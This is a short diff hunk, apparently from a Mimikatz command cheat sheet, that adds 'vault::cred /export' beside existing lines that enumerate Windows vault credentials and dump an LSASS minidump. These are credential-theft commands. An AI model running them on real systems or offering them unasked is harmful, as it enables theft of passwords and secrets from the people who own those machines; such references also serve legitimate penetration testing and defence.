@@ -106,6 +106,7 @@ vault::cred
 # Enumerate Vault Credentials
 vault::list
 vault::cred /patch
+vault::cred /export
 
 # Dump LSASS Minidump
 sekurlsa::minidump lsass.dmp
